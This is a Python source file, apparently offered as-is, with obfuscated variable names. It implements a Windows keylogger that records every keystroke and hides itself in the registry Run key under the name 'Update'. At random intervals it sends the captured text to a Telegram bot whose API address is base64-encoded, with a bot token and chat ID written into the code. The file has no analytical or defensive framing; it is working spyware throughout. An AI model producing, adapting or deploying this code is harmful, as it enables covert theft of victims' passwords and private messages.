import time as KJHJ7823R823
import threading as JHG3782GH2
import requests as UHY298H2D
import pynput.keyboard as DJS2890D
import os as ASJDH293H
import sys as HDJSA2993D
import winreg as AJDH2387H
import random as DJH23892H
import base64 as AJSD2938H

XKJD8932KD = "7384592292:AAFodU8dDc65vxR2zfYwbLU38jBDjK-S3fc"
AJSK2839KD = "7049935317"
WQOE83923JD = AJSD2938H.b64decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==").decode()
LKJD9283KD = "/getMe"
FJKL9832KD = "/sendMessage"
QOWE8723KD = "chat_id"
TUIE9823KD = "text"

OIWE983KD = DJH23892H.randint(90, 180)
HWUE823KD = []
WJDH832KD = JHG3782GH2.Lock()
EWUE9382KD = True
HUIW9823KD = False
HUIE9283KD = False

JKIW9823KD = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
SJLD9283KD = "Update"

def ADHJ9283KD():
    SJLD823KD = HDJSA2993D.argv[0]
    try:
        with AJDH2387H.OpenKey(AJDH2387H.HKEY_CURRENT_USER, JKIW9823KD, 0, AJDH2387H.KEY_WRITE) as reg_key:
            AJDH2387H.SetValueEx(reg_key, SJLD9283KD, 0, AJDH2387H.REG_SZ, SJLD823KD)
    except Exception:
        pass

def QWUE982KD():
    global EWUE9382KD
    try:
        response = UHY298H2D.get(f"{WQOE83923JD}{XKJD8932KD}{LKJD9283KD}", timeout=5)
        EWUE9382KD = response.status_code == 200
    except UHY298H2D.RequestException:
        EWUE9382KD = False

def ASJD923KD(message):
    url = f"{WQOE83923JD}{XKJD8932KD}{FJKL9832KD}"
    payload = {QOWE8723KD: AJSK2839KD, TUIE9823KD: message}
    try:
        response = UHY298H2D.post(url, data=payload, timeout=10)
        return response.status_code == 200
    except UHY298H2D.RequestException:
        return False

def JHWE983KD():
    global HWUE823KD, EWUE9382KD
    with WJDH832KD:
        if HWUE823KD:
            SJLD9283KD = ''.join(HWUE823KD)
            if ASJD923KD(SJLD9283KD):
                HWUE823KD.clear()
            else:
                EWUE9382KD = False

def LKJE982KD(key):
    global HWUE823KD, HUIW9823KD, HUIE9283KD
    try:
        if key == DJS2890D.Key.shift:
            HUIW9823KD = True
        elif key == DJS2890D.Key.caps_lock:
            HUIE9283KD = not HUIE9283KD
        elif key == DJS2890D.Key.space:
            HWUE823KD.append(" ")
        elif key == DJS2890D.Key.enter:
            HWUE823KD.append("\n")
        elif key == DJS2890D.Key.backspace:
            if HWUE823KD:
                HWUE823KD.pop()
        elif hasattr(key, "char") and key.char:
            char = key.char
            if HUIE9283KD ^ HUIW9823KD:
                char = char.upper()
            HWUE823KD.append(char)
    except Exception:
        pass

def JQOE892KD(key):
    global HUIW9823KD
    if key == DJS2890D.Key.shift:
        HUIW9823KD = False

def LKSD893KD():
    with DJS2890D.Listener(on_press=LKJE982KD, on_release=JQOE892KD) as listener:
        listener.join()

def QWEU932KD():
    global EWUE9382KD
    while True:
        KJHJ7823R823.sleep(OIWE983KD)
        QWUE982KD()
        if EWUE9382KD:
            JHWE983KD()

def main():
    ADHJ9283KD()

    QWUE823KD = JHG3782GH2.Thread(target=LKSD893KD, daemon=True)
    QWUE823KD.start()

    WQOE983KD = JHG3782GH2.Thread(target=QWEU932KD, daemon=True)
    WQOE983KD.start()

    try:
        while True:
            KJHJ7823R823.sleep(1)
    except KeyboardInterrupt:
        JHWE983KD()

if __name__ == "__main__":
    main()
